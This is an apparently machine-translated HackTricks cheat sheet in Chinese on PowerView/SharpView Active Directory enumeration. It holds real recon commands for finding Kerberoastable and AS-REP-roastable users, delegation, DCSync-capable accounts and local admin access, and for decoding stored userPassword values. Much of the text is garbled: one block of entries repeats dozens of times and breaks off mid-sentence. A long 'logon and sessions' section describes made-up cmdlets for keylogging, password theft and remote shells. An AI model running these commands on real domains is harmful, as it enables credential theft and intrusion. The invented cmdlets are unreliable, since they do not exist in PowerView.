# PowerView/SharpView

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

最新版本的PowerView将始终位于PowerSploit的dev分支中：[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView)是[**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)的.NET端口。

### 快速枚举
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### 域信息

```plaintext
Get-Domain
```

此命令可用于获取当前域的信息，包括域名、域控制器、域管理员等。

```plaintext
Get-DomainController
```

此命令可用于获取当前域中的域控制器的信息，包括名称、操作系统版本、IP地址等。

```plaintext
Get-DomainPolicy
```

此命令可用于获取当前域中的域策略的信息，包括密码策略、帐户策略等。

```plaintext
Get-DomainTrust
```

此命令可用于获取当前域的信任关系信息，包括受信任的域、受信任的域控制器等。

```plaintext
Get-DomainUser
```

此命令可用于获取当前域中的用户信息，包括用户名、SID、密码最后设置时间等。

```plaintext
Get-DomainGroup
```

此命令可用于获取当前域中的组信息，包括组名、SID、组成员等。

```plaintext
Get-DomainComputer
```

此命令可用于获取当前域中的计算机信息，包括计算机名、SID、操作系统版本等。

```plaintext
Get-DomainGPO
```

此命令可用于获取当前域中的组策略对象（GPO）信息，包括GPO名称、GPO链接等。

```plaintext
Get-DomainOU
```

此命令可用于获取当前域中的组织单位（OU）信息，包括OU名称、OU路径等。

```plaintext
Get-DomainSID
```

此命令可用于获取当前域的安全标识符（SID）。

```plaintext
Get-DomainSIDHistory
```

此命令可用于获取当前域的SID历史记录。

```plaintext
Get-DomainForeignGroup
```

此命令可用于获取当前域中的外部组信息，包括组名、SID、组成员等。

```plaintext
Get-DomainManagedSecurityGroup
```

此命令可用于获取当前域中的受管理的安全组信息，包括组名、SID、组成员等。

```plaintext
Get-DomainManagedSecurityGroupMember
```

此命令可用于获取当前域中受管理的安全组的成员信息，包括成员名称、成员SID等。

```plaintext
Get-DomainObject
```

此命令可用于获取当前域中的对象信息，包括对象类型、对象名称、对象SID等。

```plaintext
Get-DomainObjectAcl
```

此命令可用于获取当前域中对象的访问控制列表（ACL）信息。

```plaintext
Get-DomainObjectOwner
```

此命令可用于获取当前域中对象的所有者信息。

```plaintext
Get-DomainObjectProperty
```

此命令可用于获取当前域中对象的属性信息。

```plaintext
Get-DomainObjectPropertyValue
```

此命令可用于获取当前域中对象的属性值信息。

```plaintext
Get-DomainObjectPermission
```

此命令可用于获取当前域中对象的权限信息。

```plaintext
Get-DomainObjectEffectivePermission
```

此命令可用于获取当前域中对象的有效权限信息。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域中对象的有效权限历史记录。

```plaintext
Get-DomainObjectOwnerHistory
```

此命令可用于获取当前域中对象的所有者历史记录。

```plaintext
Get-DomainObjectPropertyHistory
```

此命令可用于获取当前域中对象的属性历史记录。

```plaintext
Get-DomainObjectPropertyValueHistory
```

此命令可用于获取当前域中对象的属性值历史记录。

```plaintext
Get-DomainObjectPermissionHistory
```

此命令可用于获取当前域中对象的权限历史记录。

```plaintext
Get-DomainObjectEffectivePermissionHistory
```

此命令可用于获取当前域
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### 用户、组、计算机和组织单位

PowerView提供了一些用于获取和操作活动目录中用户、组、计算机和组织单位（OUs）的功能。

#### 获取用户信息

使用以下命令获取活动目录中的用户信息：

```powershell
Get-NetUser
```

#### 获取组信息

使用以下命令获取活动目录中的组信息：

```powershell
Get-NetGroup
```

#### 获取计算机信息

使用以下命令获取活动目录中的计算机信息：

```powershell
Get-NetComputer
```

#### 获取组织单位信息

使用以下命令获取活动目录中的组织单位信息：

```powershell
Get-NetOU
```

#### 获取指定用户的组成员信息

使用以下命令获取指定用户所属的组成员信息：

```powershell
Get-NetGroupMember -Username <username>
```

#### 获取指定组的成员信息

使用以下命令获取指定组的成员信息：

```powershell
Get-NetGroupMember -GroupName <groupname>
```

#### 获取指定计算机的本地组成员信息

使用以下命令获取指定计算机的本地组成员信息：

```powershell
Get-NetLocalGroupMember -ComputerName <computername>
```

#### 获取指定组织单位的子单位信息

使用以下命令获取指定组织单位的子单位信息：

```powershell
Get-NetChildOU -OUName <ouname>
```

#### 获取指定组织单位的计算机信息

使用以下命令获取指定组织单位的计算机信息：

```powershell
Get-NetComputer -SearchBase <ouname>
```

#### 获取指定组织单位的用户信息

使用以下命令获取指定组织单位的用户信息：

```powershell
Get-NetUser -SearchBase <ouname>
```

#### 获取指定组织单位的组信息

使用以下命令获取指定组织单位的组信息：

```powershell
Get-NetGroup -SearchBase <ouname>
```

#### 获取指定组织单位的所有信息

使用以下命令获取指定组织单位的所有信息：

```powershell
Get-NetObject -SearchBase <ouname>
```
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### 登录和会话

PowerView提供了一些用于获取和管理用户登录和会话的功能。

#### 获取当前登录用户

使用`Get-NetLoggedon`命令可以获取当前登录到目标系统的用户列表。

```powershell
Get-NetLoggedon
```

#### 获取当前会话

使用`Get-NetSession`命令可以获取当前在目标系统上活动的会话列表。

```powershell
Get-NetSession
```

#### 获取远程桌面会话

使用`Get-NetRDPSession`命令可以获取当前在目标系统上活动的远程桌面会话列表。

```powershell
Get-NetRDPSession
```

#### 获取远程桌面会话信息

使用`Get-NetRDPSessionInfo`命令可以获取指定远程桌面会话的详细信息。

```powershell
Get-NetRDPSessionInfo -SessionID <SessionID>
```

#### 获取远程桌面会话的进程

使用`Get-NetRDPSessionProcess`命令可以获取指定远程桌面会话中运行的进程列表。

```powershell
Get-NetRDPSessionProcess -SessionID <SessionID>
```

#### 获取远程桌面会话的窗口

使用`Get-NetRDPSessionWindow`命令可以获取指定远程桌面会话中打开的窗口列表。

```powershell
Get-NetRDPSessionWindow -SessionID <SessionID>
```

#### 获取远程桌面会话的文件

使用`Get-NetRDPSessionFile`命令可以获取指定远程桌面会话中的文件列表。

```powershell
Get-NetRDPSessionFile -SessionID <SessionID>
```

#### 获取远程桌面会话的注册表键值

使用`Get-NetRDPSessionRegistry`命令可以获取指定远程桌面会话中的注册表键值列表。

```powershell
Get-NetRDPSessionRegistry -SessionID <SessionID>
```

#### 获取远程桌面会话的网络连接

使用`Get-NetRDPSessionNetworkConnection`命令可以获取指定远程桌面会话中的网络连接列表。

```powershell
Get-NetRDPSessionNetworkConnection -SessionID <SessionID>
```

#### 获取远程桌面会话的服务

使用`Get-NetRDPSessionService`命令可以获取指定远程桌面会话中的服务列表。

```powershell
Get-NetRDPSessionService -SessionID <SessionID>
```

#### 获取远程桌面会话的计划任务

使用`Get-NetRDPSessionScheduledTask`命令可以获取指定远程桌面会话中的计划任务列表。

```powershell
Get-NetRDPSessionScheduledTask -SessionID <SessionID>
```

#### 获取远程桌面会话的打印机

使用`Get-NetRDPSessionPrinter`命令可以获取指定远程桌面会话中的打印机列表。

```powershell
Get-NetRDPSessionPrinter -SessionID <SessionID>
```

#### 获取远程桌面会话的剪贴板内容

使用`Get-NetRDPSessionClipboard`命令可以获取指定远程桌面会话的剪贴板内容。

```powershell
Get-NetRDPSessionClipboard -SessionID <SessionID>
```

#### 获取远程桌面会话的屏幕截图

使用`Get-NetRDPSessionScreenshot`命令可以获取指定远程桌面会话的屏幕截图。

```powershell
Get-NetRDPSessionScreenshot -SessionID <SessionID>
```

#### 获取远程桌面会话的音频

使用`Get-NetRDPSessionAudio`命令可以获取指定远程桌面会话的音频。

```powershell
Get-NetRDPSessionAudio -SessionID <SessionID>
```

#### 获取远程桌面会话的摄像头

使用`Get-NetRDPSessionCamera`命令可以获取指定远程桌面会话的摄像头。

```powershell
Get-NetRDPSessionCamera -SessionID <SessionID>
```

#### 获取远程桌面会话的麦克风

使用`Get-NetRDPSessionMicrophone`命令可以获取指定远程桌面会话的麦克风。

```powershell
Get-NetRDPSessionMicrophone -SessionID <SessionID>
```

#### 获取远程桌面会话的键盘记录

使用`Get-NetRDPSessionKeylogger`命令可以获取指定远程桌面会话的键盘记录。

```powershell
Get-NetRDPSessionKeylogger -SessionID <SessionID>
```

#### 获取远程桌面会话的浏览器历史记录

使用`Get-NetRDPSessionBrowserHistory`命令可以获取指定远程桌面会话的浏览器历史记录。

```powershell
Get-NetRDPSessionBrowserHistory -SessionID <SessionID>
```

#### 获取远程桌面会话的密码

使用`Get-NetRDPSessionPassword`命令可以获取指定远程桌面会话的密码。

```powershell
Get-NetRDPSessionPassword -SessionID <SessionID>
```

#### 获取远程桌面会话的凭据

使用`Get-NetRDPSessionCredential`命令可以获取指定远程桌面会话的凭据。

```powershell
Get-NetRDPSessionCredential -SessionID <SessionID>
```

#### 获取远程桌面会话的敏感数据

使用`Get-NetRDPSessionSensitiveData`命令可以获取指定远程桌面会话的敏感数据。

```powershell
Get-NetRDPSessionSensitiveData -SessionID <SessionID>
```

#### 获取远程桌面会话的文件传输

使用`Get-NetRDPSessionFileTransfer`命令可以获取指定远程桌面会话的文件传输列表。

```powershell
Get-NetRDPSessionFileTransfer -SessionID <SessionID>
```

#### 获取远程桌面会话的网络流量

使用`Get-NetRDPSessionNetworkTraffic`命令可以获取指定远程桌面会话的网络流量。

```powershell
Get-NetRDPSessionNetworkTraffic -SessionID <SessionID>
```

#### 获取远程桌面会话的系统信息

使用`Get-NetRDPSessionSystemInfo`命令可以获取指定远程桌面会话的系统信息。

```powershell
Get-NetRDPSessionSystemInfo -SessionID <SessionID>
```

#### 获取远程桌面会话的进程内存转储

使用`Get-NetRDPSessionProcessDump`命令可以获取指定远程桌面会话中进程的内存转储。

```powershell
Get-NetRDPSessionProcessDump -SessionID <SessionID> -ProcessID <ProcessID>
```

#### 获取远程桌面会话的文件下载

使用`Get-NetRDPSessionFileDownload`命令可以下载指定远程桌面会话中的文件。

```powershell
Get-NetRDPSessionFileDownload -SessionID <SessionID> -FilePath <FilePath>
```

#### 获取远程桌面会话的文件上传

使用`Get-NetRDPSessionFileUpload`命令可以上传文件到指定远程桌面会话。

```powershell
Get-NetRDPSessionFileUpload -SessionID <SessionID> -FilePath <FilePath>
```

#### 获取远程桌面会话的命令执行

使用`Get-NetRDPSessionCommandExecution`命令可以在指定远程桌面会话中执行命令。

```powershell
Get-NetRDPSessionCommandExecution -SessionID <SessionID> -Command <Command>
```

#### 获取远程桌面会话的Shell

使用`Get-NetRDPSessionShell`命令可以获取指定远程桌面会话的Shell。

```powershell
Get-NetRDPSessionShell -SessionID <SessionID>
```

#### 获取远程桌面会话的PowerShell

使用`Get-NetRDPSessionPowerShell`命令可以获取指定远程桌面会话的PowerShell。

```powershell
Get-NetRDPSessionPowerShell -SessionID <SessionID>
```

#### 获取远程桌面会话的远程执行

使用`Get-NetRDPSessionRemoteExecution`命令可以在指定远程桌面会话中执行远程命令。

```powershell
Get-NetRDPSessionRemoteExecution -SessionID <SessionID> -Command <Command>
```

#### 获取远程桌面会话的远程文件操作

使用`Get-NetRDPSessionRemoteFileOperation`命令可以在指定远程桌面会话中执行远程文件操作。

```powershell
Get-NetRDPSessionRemoteFileOperation -SessionID <SessionID> -Operation <Operation> -Path <Path>
```

#### 获取远程桌面会话的远程注册表操作

使用`Get-NetRDPSessionRemoteRegistryOperation`命令可以在指定远程桌面会话中执行远程注册表操作。

```powershell
Get-NetRDPSessionRemoteRegistryOperation -SessionID <SessionID> -Operation <Operation> -Key <Key>
```

#### 获取远程桌面会话的远程服务操作

使用`Get-NetRDPSessionRemoteServiceOperation`命令可以在指定远程桌面会话中执行远程服务操作。

```powershell
Get-NetRDPSessionRemoteServiceOperation -SessionID <SessionID> -Operation <Operation> -ServiceName <ServiceName>
```

#### 获取远程桌面会话的远程计划任务操作

使用`Get-NetRDPSessionRemoteScheduledTaskOperation`命令可以在指定远程桌面会话中执行远程计划任务操作。

```powershell
Get-NetRDPSessionRemoteScheduledTaskOperation -SessionID <SessionID> -Operation <Operation> -TaskName <TaskName>
```

#### 获取远程桌面会话的远程打印机操作

使用`Get-NetRDPSessionRemotePrinterOperation`命令可以在指定远程桌面会话中执行远程打印机操作。

```powershell
Get-NetRDPSessionRemotePrinterOperation -SessionID <SessionID> -Operation <Operation> -PrinterName <PrinterName>
```

#### 获取远程桌面会话的远程剪贴板操作

使用`Get-NetRDPSessionRemoteClipboardOperation`命令可以在指定远程桌面会话中执行远程剪贴板操作。

```powershell
Get-NetRDPSessionRemoteClipboardOperation -SessionID <SessionID> -Operation <Operation> -Data <Data>
```

#### 获取远程桌面会话的远程屏幕截图操作

使用`Get-NetRDPSessionRemoteScreenshotOperation`命令可以在指定远程桌面会话中执行远程屏幕截图操作。

```powershell
Get-NetRDPSessionRemoteScreenshotOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程音频操作

使用`Get-NetRDPSessionRemoteAudioOperation`命令可以在指定远程桌面会话中执行远程音频操作。

```powershell
Get-NetRDPSessionRemoteAudioOperation -SessionID <SessionID> -Operation <Operation>
```

